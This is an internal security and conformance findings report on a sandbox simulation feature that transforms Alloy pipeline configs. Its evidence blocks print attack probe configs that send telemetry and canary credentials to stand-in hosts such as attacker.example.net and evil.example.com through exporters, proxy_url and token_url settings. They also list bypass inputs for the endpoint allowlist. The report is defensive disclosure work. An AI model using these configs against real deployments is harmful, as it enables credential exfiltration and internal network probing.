# S3 sandbox simulation — security & conformance findings (2026-08-20)

Milestone 7 (VB-1 §6.4) is **implemented but its containment claim is NOT sound**. The feature is
**disabled by default** (`simulator.enabled` has no default, so it is `false`; both compose files
default `SHEPHERD_SIM_ENABLED` to `false`) and **must stay disabled** until the critical findings
below are closed.

These came from an adversarial verification pass instructed to break the containment claim rather
than confirm it, plus independent build and plan-conformance passes. All three returned FAIL.

## The headline

The design's safety boundary is the simulation transform: "no real credentials ever enter the
sandbox, and a malicious graph cannot reach anything except the capture harness". Neither half
holds yet.

- The secret sweep is **type-driven**, so it only removes attributes the schema declares as
  `secret`. Most credential-bearing attributes in the shipped artifact are declared `string`.
  Independently confirmed: walking top-level and one block level, **147 of 290** credential-named
  attributes are not typed `secret` (the verifier, walking deeper, measured 518 of 718).
  A credential in one of those attributes survives the transform verbatim.
- A graph can name an arbitrary host directly (a literal `__address__` on `prometheus.scrape`),
  which passes the transform, real `alloy validate`, and the endpoint allowlist. The only remaining
  control is Docker's `internal: true` network — and no automated test verifies its observable
  effect.

The verified-sound parts are recorded too (finding on the red proof and tenant isolation): the
zero-secrets proof genuinely fails when the drop is removed **for attributes the artifact types as
`secret`**, and run-API tenant isolation is real at both layers.

## Findings

### 1. [CRITICAL] `internal/simulate/transform.go`
*(found by: security)*

The secret sweep is purely type-driven, so any credential that upstream Alloy declares as `string` rather than `secret` enters the sandbox verbatim. Proven for otelcol.receiver.cloudflare `secret`, otelcol.receiver.solace `auth.sasl_xauth2.bearer`, and otelcol.processor.resourcedetection `openshift.token`. The solace case renders with ZERO diagnostics, passes real `alloy validate` v1.18.1 with exit 0, and passes the simsvc endpoint allowlist — it clears every gate the design has. 518 of 718 credential-named attributes in the shipped artifact are NOT typed `secret`.

<details><summary>evidence</summary>

```
Attack probe (throwaway main importing shepherd/internal/simulate + internal/visual, run with `go run`):

=== otelcol.receiver.solace, transformed render ===
otelcol.receiver.solace "exfil" {
  broker = "broker.evil.example.com"
  queue = "q"
  auth {
    sasl_xauth2 {
      username = "svc"
      bearer = "CANARY-PROD-BEARER-TOKEN"
    }
  }
  output {
  }
}
*** simsvc.CheckEndpoints: ALLOWED by the endpoint allowlist ***

$ docker run --rm -v /tmp/attack.alloy:/etc/alloy/config.alloy:ro grafana/alloy:v1.18.1 validate --stability.level=experimental /etc/alloy/config.alloy
validate exit=0

=== otelcol.receiver.cloudflare ===
otelcol.receiver.cloudflare "cf" {
  endpoint = "0.0.0.0:12345"
  secret = "CANARY-CLOUDFLARE-API-SECRET"
}
*** LEAK: canary "CANARY-CLOUDFLARE-API-SECRET" PRESENT in the transformed sandbox config ***

=== otelcol.processor.resourcedetection ===
otelcol.processor.resourcedetection "rd" { openshift { token = "CANARY-OPENSHIFT-TOKEN" } }
*** LEAK: canary "CANARY-OPENSHIFT-TOKEN" PRESENT ***

Artifact types (python over internal/schema/artifacts/alloy-v1.18.1.json):
  string    otelcol.receiver.cloudflare  secret
  string    otelcol.receiver.solace  auth.sasl_xauth2.bearer
  string    otelcol.processor.resourcedetection  openshift.token
Counter({'string': 490, 'secret': 200, 'capsule': 16, 'bool': 10, ...}) over credential-named attrs

Code: dropSecretTypedPr
… (truncated)
```
</details>

### 2. [CRITICAL] `internal/simulate/transform.go`
*(found by: security)*

A malicious graph reaches an arbitrary host through BOTH software gates. A prometheus.scrape node with a literal bare-hostname `__address__` renders with zero diagnostics, survives Transform untouched, passes real `alloy validate` (exit 0), and is ALLOWED by simsvc's endpoint allowlist (which by design does not inspect bare hostnames). The only remaining control is Docker's `internal: true` network, whose observable effect no automated test verifies.

<details><summary>evidence</summary>

```
Probe output:

prometheus.scrape "ssrf" {
  targets = [{__address__ = "internal-vault.example.net", __scheme__ = "https", job = "x"}]
  forward_to = [prometheus.remote_write.rw.receiver]
}

prometheus.remote_write "rw" {
  endpoint {
    url = "http://simulator:9110/capture/prometheus/api/v1/write"
  }
}

render diagnostics: 0
*** allowlist ALLOWED ***
$ docker run --rm ... grafana/alloy:v1.18.1 validate --stability.level=experimental
validate exit=0

The destination WAS correctly re-pointed at the harness; the scrape target was not, because prometheus.scrape is not a Sources-category discovery.*/loki.source.* node and so no rule in Transform ever looks at it.
```
</details>

### 3. [HIGH] `internal/simulate/transform.go`
*(found by: security)*

Destination endpoints ARE left pointing at user-supplied URLs after transform (question 3: yes). rewriteDestinations only writes the overlay's `endpoint_paths`, so sibling address-bearing attributes on the SAME mapped destination survive: otelcol.exporter.otlphttp's per-signal `logs_endpoint`/`traces_endpoint`/`metrics_endpoint` (which override the rewritten `client.endpoint`), `proxy_url` on prometheus.remote_write / loki.write / pyroscope.write / prometheus.write.queue / otelcol.exporter.faro / otlphttp (which tunnels the harness-destined request out through an attacker host), and `oauth2.token_url`.

<details><summary>evidence</summary>

```
Probe output:

otelcol.exporter.otlphttp "exf" {
  traces_endpoint = "https://attacker.example.net/v1/traces"
  logs_endpoint = "https://attacker.example.net/v1/logs"
  client {
    endpoint = "http://simulator:9110/capture/otlphttp"
  }
}
*** SURVIVED TRANSFORM: "attacker.example.net" ***  (removed: "prod.example.com")

prometheus.remote_write "rw" {
  endpoint {
    url = "http://simulator:9110/capture/prometheus/api/v1/write"
    proxy_url = "http://attacker.example.net:3128"
  }
}
*** SURVIVED TRANSFORM: "attacker.example.net" ***

loki.write "lw" { endpoint { url = "http://simulator:9110/..." oauth2 { token_url = "https://attacker.example.net/token" } } }
*** SURVIVED TRANSFORM ***

Systematic diff of overlay endpoint_paths vs. artifact address-typed attrs:
  loki.write            mapped ['endpoint.*.url']   UNMAPPED ['endpoint.proxy_url','endpoint.oauth2.token_url','endpoint.oauth2.proxy_url', ...]
  otelcol.exporter.otlphttp mapped ['client.endpoint'] UNMAPPED ['traces_endpoint','metrics_endpoint','logs_endpoint','client.proxy_url', ...]
  pyroscope.write / prometheus.write.queue / otelcol.exporter.faro: same proxy_url gap

The allowlist blocks the plain-literal forms (secondary gate), but no transform test covers any of these: grep -c "proxy_url|logs_endpoint|token_url" internal/simulate/*_test.go -> 0.
```
</details>

### 4. [HIGH] `internal/simsvc/compose_containment_test.go`
*(found by: security)*

Egress denial is configured but never verified by execution in any automated test. compose_containment_test.go asserts only the YAML DECLARATION (sim-internal has internal: true, no ports, cap_drop). The observable probes (getent from the sim network, docker network Internal=true) live only in docs/proofs/simulator-containment.md and were run by hand. e2e/sandbox_sim_test.go contains zero containment probes, and no CI workflow ever invokes `make e2e-sim` — `make e2e` explicitly filters it out. Given the findings above, network isolation is the ONLY control actually stopping a malicious graph, and it is the one control nothing tests.

<details><summary>evidence</summary>

```
$ grep -c "getent|Internal|network inspect|nsenter" e2e/sandbox_sim_test.go
0

Makefile:43:	ginkgo --tags=e2e --randomize-all=false --label-filter='!sandbox-sim' ./e2e/...
Makefile:56:	ginkgo --tags=e2e --randomize-all=false --label-filter=sandbox-sim ./e2e/...   # target e2e-sim

$ grep -rn "e2e-sim" .github/workflows/
(no matches — .github/workflows/e2e.yml runs only `make e2e`)

e2e/sandbox_sim_test.go It() blocks: submits minimal-scrape, asserts captured series, component health, rewrite kinds. None probe the network.

compose_containment_test.go:116: Expect(simNet.Internal).To(BeTrue(), "sim-internal must be internal: true or the sandbox can reach the internet")  <- a YAML assertion, not an observed effect.
```
</details>

### 5. [HIGH] `deploy/helm/shepherd/templates/networkpolicy.yaml`
*(found by: security)*

The Helm chart — the documented Kubernetes deployment path — contains no simulator at all: no Deployment, no Service, and above all no NetworkPolicy egress restriction and no automountServiceAccountToken:false. Every containment control in §6.4 exists only in docker-compose. Anyone running Shepherd on Kubernetes with the simulator enabled has none of them.

<details><summary>evidence</summary>

```
$ grep -rn "simulator|SIMULATOR" deploy/helm/
(no output, exit 0 — zero matches across the entire chart)

$ ls deploy/helm/shepherd/templates/
_helpers.tpl configmap.yaml deployment.yaml hpa.yaml httproute.yaml ingress.yaml migrate-job.yaml networkpolicy.yaml NOTES.txt pdb.yaml secret.yaml service.yaml serviceaccount.yaml servicemonitor.yaml

The compose comment and design doc describe "NetworkPolicy egress: [], automountServiceAccountToken: false"; that posture is currently a claim with no artifact behind it.
```
</details>

### 6. [HIGH] `internal/simsvc/guard.go`
*(found by: security)*

The endpoint allowlist (the documented "second gate") has several bypasses beyond the one bare-hostname case its comment discloses: bare IPv6 host:port literals, URLs with any scheme other than http/https, hosts embedded in connection/DSN strings, and endpoints sourced from sys.env(). extractHost only recognises http(s):// URLs and the regex ^[A-Za-z0-9_.\-]+:[0-9]{1,5}$.

<details><summary>evidence</summary>

```
Probe calling simsvc.CheckEndpoints directly with allowedHosts = [simulator localhost 127.0.0.1 ::1]:

blocked: plain http URL (control)                 -> endpoint_not_allowed: ... evil.example.com
blocked: host:port literal (control)              -> endpoint_not_allowed: ... evil.example.com
*** ALLOWED (bypass): IPv6 host:port literal            [{__address__ = "[2001:db8::1]:9090"}]
*** ALLOWED (bypass): bare hostname, no port            broker = "broker.evil.example.com"
*** ALLOWED (bypass): sys.env-sourced endpoint          endpoint = sys.env("EXFIL_URL")
*** ALLOWED (bypass): mysql DSN carrying a remote host  "u:p@tcp(db.evil.example.com:3306)/x"
*** ALLOWED (bypass): ftp/other scheme URL              "ftp://evil.example.com/x"
blocked: string concatenation of a URL
blocked: port above 65535

Only the bare-hostname case is documented in the hostPortLiteral comment; the IPv6, non-http-scheme and DSN cases are not.
```
</details>

### 7. [HIGH] `internal/spa/dist/index.html`
*(found by: build)*

check-dist-consistency fails: internal/spa/dist is stale relative to web/src and contains untracked asset files that index.html references

<details><summary>evidence</summary>

```
$ make check-dist-consistency
check-single-dist: OK (1 dist directory)
ERROR: internal/spa/dist/index.html references assets/index-BAc8Yhg7.js, which is not tracked by git (git add -u would not include it)
ERROR: internal/spa/dist/index.html references assets/index-DylwsFe3.css, which is not tracked by git (git add -u would not include it)
make: *** [check-dist-consistency] Error 1

Root cause: the UI stage (SandboxRunPanel.tsx, CanvasPane.tsx, PipelineNode.tsx, Toolbar.tsx, store.ts, api/client.ts changes) modified web/src but never ran ./scripts/build-web.sh and committed the resulting internal/spa/dist output. Rebuilding via `npx playwright test`'s webServer step (`pnpm run build && vite preview`) and independently re-checking afterward both produce the SAME asset hashes (index-BAc8Yhg7.js / index-DylwsFe3.css), confirming a deterministic build that was simply never committed:

$ git status --porcelain=v1 internal/spa/dist
 M internal/spa/dist/BUILD_INFO.json
 D internal/spa/dist/assets/GraphViewPage-CFFJnTFX.js
 D internal/spa/dist/assets/PipelineNode-DVgGjD6h.js
 D internal/spa/dist/assets/VisualBuilderPage-XEWnnw-F.js
 D internal/spa/dist/assets/index-COQFyc4S.css
 D internal/spa/dist/assets/index-r9f4d-Ob.js
 M internal/spa/dist/index.html
?? internal/spa/dist/assets/GraphViewPage-4QHr7jyY.js
?? internal/spa/dist/assets/PipelineNode-DlizI8kp.js
?? internal/spa/dist/asset
… (truncated)
```
</details>

### 8. [HIGH] `web/src/visual/components/SandboxRunPanel.tsx`
*(found by: conformance)*

§6.4 step 3 requires the sandbox's stderr tail be part of the results a user sees; it is captured and plumbed all the way through simsvc -> proto -> api/client.ts, but SandboxRunPanel.tsx never reads or renders run.stderr_tail anywhere in the results view.

<details><summary>evidence</summary>

```
grep -rn "stderr" web/src/visual/ returns nothing; web/src/api/client.ts:346/404 defines `stderr_tail: res.stderrTail` on `SimulateRunResult`, but SandboxRunPanel.tsx's `ResultsView` (which renders the metrics/logs/health tabs and the rewrite disclosure) never references `run.stderr_tail`. The field is dead on the client: available in state, invisible to the user. This item was not listed in the UI stage's own 'incomplete' notes, so the gap was not disclosed.
```
</details>

### 9. [MEDIUM] `internal/simulate/transform.go`
*(found by: security)*

Question 5 answered: yes — an unmapped source silently passes through instead of failing cannot_stub, because applyStubs gates on the component NAME PREFIX (discovery. / loki.source.) rather than on the Sources category. 80 of the 114 Sources-category components bypass the stub requirement entirely, including every prometheus.exporter.* (mysql, postgres, redis, mongodb, snmp, blackbox, cloudwatch, github, azure, gcp), every otelcol.receiver.*, and all four prometheus.operator.* Kubernetes-API discoverers. Each runs against whatever the user authored.

<details><summary>evidence</summary>

```
internal/simulate/transform.go applyStubs:
	if policy.Category != categorySources { continue }
	if !strings.HasPrefix(n.Component, "discovery.") && !strings.HasPrefix(n.Component, "loki.source.") { continue }
	if policy.Stub == nil { -> cannot_stub }

Probe contrast, same run:
===== prometheus.exporter.blackbox passes through as authored =====
prometheus.exporter.blackbox "bb" {
  target {
    name = "t"
    address = "internal-vault.example.net"
  }
}
*** SURVIVED TRANSFORM: "internal-vault.example.net" ***
*** allowlist ALLOWED ***

===== discovery.process (discovery.* prefix, no stub) =====
transform REFUSED: cannot stub discovery.process — use S2 for its downstream rules

Count from overlay.json: 114 sources; 80 of them carry no discovery_stub and are not discovery.*/loki.source.*-prefixed.
```
</details>

### 10. [MEDIUM] `internal/visual/render.go`
*(found by: security)*

GraphBindings are an essentially unvalidated channel into the sandbox config. render.go:534 writes `bind.Prop = bind.Ref.Expr` verbatim at the node's top level with no type check, while the transform (dropSecretTypedProps) and its own self-check (checkContainment P1) only remove a binding whose Prop is a TOP-LEVEL secret-typed attribute or an endpoint-path tail. topLevelType() returns "" for any nested or dotted Prop, so those bindings survive with their expression intact — including a binding onto a top-level attribute that is credential-bearing but declared `string` (e.g. otelcol.receiver.cloudflare `secret`), which produces valid Alloy.

<details><summary>evidence</summary>

```
Probe output:

prometheus.remote_write "rw" {
  endpoint {
    url = "http://simulator.example.com:9110/capture/prometheus/api/v1/write"
  }
  password = "CANARY-BOUND-PASSWORD"
}
*** LEAK: canary "CANARY-BOUND-PASSWORD" PRESENT in the transformed sandbox config ***

  endpoint.0.basic_auth.0.password = "CANARY-DOTTED-PASSWORD"
*** LEAK: canary "CANARY-DOTTED-PASSWORD" PRESENT ***

Code (transform.go, S2 and P1 both):
	if !known || topLevelType(schema, owner.Component, b.Prop) != typeSecret { binds = append(binds, b); continue }
topLevelType only scans comp.Attributes for an exact top-level name match.

These two specific shapes are later rejected by alloy validate (unknown attribute), so their practical reach is Shepherd-side; the same channel onto a real string-typed attribute is not.
```
</details>

### 11. [MEDIUM] `internal/simulate/transform_validate_test.go`
*(found by: security)*

The only spec that runs the transformed config against the real Alloy binary self-skips, and CI provides neither `alloy` on PATH nor SHEPHERD_VALIDATE_ALLOY_BINARY — so it never runs. This reintroduces exactly the self-skipping pattern the repo just removed (commit a2db25d), and internal/visual/render_test.go already solved it with dockerAlloyShim(), which this file does not use.

<details><summary>evidence</summary>

```
internal/simulate/transform_validate_test.go:
	It("runs: every transformed corpus graph passes stages 1-2 against the real binary", Label("needs-alloy-binary"), func() {
		binary := alloyBinary()
		if binary == "" {
			Skip("no Alloy binary: set SHEPHERD_VALIDATE_ALLOY_BINARY or put `alloy` on PATH")

Reproduced in the state CI runs in:
$ which alloy -> alloy not found ; $SHEPHERD_VALIDATE_ALLOY_BINARY -> empty
$ go test ./internal/simulate/ -count=1 -v
Ran 37 of 38 Specs in 4.170 seconds
SUCCESS! -- 37 Passed | 0 Failed | 0 Pending | 1 Skipped

$ grep -rn "SHEPHERD_VALIDATE_ALLOY_BINARY" .github/workflows/ci.yml -> no matches
$ grep -n dockerAlloyShim internal/visual/render_test.go -> 510,515 (the fallback this file lacks)
```
</details>

### 12. [MEDIUM] `internal/simsvc/queue.go`
*(found by: conformance)*

§6.4 says runs are 'queued (1-2 concurrent)'; the simulator's Queue hard-codes exactly ONE sandbox slot, so true execution concurrency is always 1, not 1-2, regardless of the Shepherd-side `max_concurrent_runs` default of 2.

<details><summary>evidence</summary>

```
internal/simsvc/queue.go:83: "Queue serialises runs onto THE SINGLE sandbox slot and owns run state." / line 85-86: "One slot, not a configurable pool: the capture URLs the transform writes..." Meanwhile internal/config/config.go:244 sets `v.SetDefault("simulator.max_concurrent_runs", 2)` on the Shepherd side, so up to 2 RunWorker slots will submit runs that the harness then serializes via its own 429/backlog path (server.go:124-125). This is a real, previously self-disclosed deviation (the SIMULATOR stage's own incomplete list says so) rather than a silent gap, but it means the plan's '1-2 concurrent' execution requirement is not literally met -- only the queue-depth config knob is.
```
</details>

### 13. [MEDIUM] `e2e/sandbox_sim_test.go`
*(found by: conformance)*

§7.4/§11 item 9's 'Simulator run lifecycle' requirement (submit minimal-scrape -> poll to completed within 90s -> captured series present, health all-green) is implemented as a real e2e spec against the live simulator container, but the happy-path spec is currently RED, blocked by a pre-existing internal/visual/render.go defect (list-cardinality bracket-wrap breaks `alloy run` for any discovery-sourced graph, including minimal-scrape's own committed golden).

<details><summary>evidence</summary>

```
e2e/sandbox_sim_test.go:14-16: "KNOWN BLOCKER (docs/proofs/sandbox-sim-e2e.md has the full evidence): as of this writing the first It below is RED against a real simulator..." -- confirmed genuine (not self-skipping): the spec builds cleanly (`go build -tags e2e ./e2e/...` succeeds) and the failure is documented with real command/JSON output in docs/proofs/sandbox-sim-e2e.md. The containment mechanism itself (destination-rewrite kill-probe) was separately verified green using an equivalent graph that avoids the render.go bug, so the underlying S3 run pipeline works; the specific named corpus scenario does not, today, in CI or by hand, satisfy the design doc's literal item-9 acceptance test.
```
</details>

### 14. [LOW] `internal/migrations/sql/0007_simulate_runs.up.sql`
*(found by: security)*

Question 7: the UNtransformed authored graph is persisted verbatim in simulate_runs.graph JSONB for the retention window, and stderr_tail stores the sandbox Alloy's stderr, which echoes whole config blocks (including the string-typed credential attributes of finding 1) on any error. Both are same-tenant exposure, so this is low severity, but both sit in Postgres in plaintext. Positives: nothing logs the graph or rendered config, Rewrite.LogValue redacts From to "***", and GetRun does not return `graph`.

<details><summary>evidence</summary>

```
internal/migrations/sql/0007_simulate_runs.up.sql:
    graph                      JSONB NOT NULL,
    stderr_tail                TEXT NOT NULL DEFAULT '',

Alloy echoing config content on stderr (real output from the validate run above):
  Error: /etc/alloy/config.alloy:3:1: missing required block "output"
   9 | |       bearer = "CANARY-PROD-BEARER-TOKEN"

proto/shepherd/mgmt/v1/simulate.proto message SimulateRun has fields 1-17 and no `graph`, so GetRun does not echo it back.
Logging audit: grep over internal/simulate/worker.go, client.go and internal/mgmtapi/rpc_simulate.go shows no graph/config in any slog call; audit detail is node_count/edge_count/duration_seconds only.
```
</details>

### 15. [LOW] `internal/simulate/transform.go`
*(found by: security)*

VERIFIED SOUND (recorded for completeness, not a defect). Two of the seven questions came back clean. (2) The zero-secrets red proof is genuine: deleting the dropSecretTypedProps call turns 2 specs red with the runtime self-check naming the leaking paths — for secrets the artifact actually declares as `secret`. (6) Run-API tenant isolation is real at both layers: the interceptor scopes the org-admin check to the request's org id, and loadRun returns NotFound (never PermissionDenied) on org mismatch; both the Connect and REST tenant-isolation specs pass.

<details><summary>evidence</summary>

```
Red proof (I edited transform.go, ran, then restored — `git diff --stat internal/simulate/transform.go` is empty):
  baseline: ok shepherd/internal/simulate 5.031s
  with `rewrites = append(rewrites, dropSecretTypedProps(&out, req.Schema)...)` removed:
    Summarizing 2 Failures:
      [FAIL] Transform: no credential reaches the sandbox [It] drops every credential form the renderer can emit
      [FAIL] Transform: no credential reaches the sandbox [It] drops a secret-typed binding that no other rule can see
    FAIL! -- 35 Passed | 2 Failed | 0 Pending | 1 Skipped

Tenant isolation:
$ go test ./internal/mgmtapi/ -count=1 -v -args -ginkgo.focus="tenant isolation"
Ran 2 of 93 Specs in 2.394 seconds
SUCCESS! -- 2 Passed | 0 Failed | 0 Pending | 91 Skipped

rpc_simulate.go loadRun: `if run.OrgID != orgID { return ..., connect.NewError(connect.CodeNotFound, errRunNotFound) }`
rpc_interceptor.go: orgID taken from the request via orgScoped, then auth.Authorize(ctx, st, sess, orgID, RoleOrgAdmin).
```
</details>

### 16. [LOW] `internal/schema/simpolicy.go`
*(found by: conformance)*

The overlay guard for `sim_destination` (destinations) enforces exhaustive coverage -- every Destinations-category component must have a policy or be explicitly on the unmappable list, failing schema-verify otherwise -- but no equivalent exhaustiveness check exists for `discovery_stub` (sources): a newly added, unmapped discovery.*/loki.source.* component would pass validateSimPolicy silently and only fail at S3 runtime with `cannot_stub`.

<details><summary>evidence</summary>

```
internal/schema/simpolicy.go:106-115 implements the exhaustive switch for `sim_destination` (`case category == "destinations" && !unmappableDestinations[key]: violations = append(...)`). The `discovery_stub` branch at line 98 only runs `validateStub` when the key IS present (`if stub, present := comp["discovery_stub"]; present`) -- there is no category=="sources" branch checking for absence the way destinations has. This asymmetry was accurately scoped in the TRANSFORM stage's own summary (which only claims exhaustiveness for Destinations), so it is not a misrepresentation, but it is a real, checkable gap against the checklist item 'the overlay guard covering the discovery-stub map' -- the guard covers correctness of present entries, not completeness of coverage.
```
</details>

### 17. [LOW] `docs/proofs/`
*(found by: conformance)*

§7.9's mutation-gate extension calls for the transform secret-drop proof to be registered as one of the three new VB invariants in the 8-invariant PR-gate check; no such registry/enumeration of proof entries exists anywhere in the repo (searched for 'mutation gate', 'WSR', '8-invariant' outside the design doc itself), so this was not just skipped by this stage but appears to have no implementation to register into.

<details><summary>evidence</summary>

```
grep -rln "mutation.gate|8-invariant" across .go/.md/Makefile/scripts returns nothing outside docs/visual-builder-design-VB1.md itself. docs/proofs/transform-secret-drop.md exists (209 lines, real red/green output) but is not referenced by any gate-check script or list. This was accurately disclosed as incomplete by the TRANSFORM stage.
```
</details>
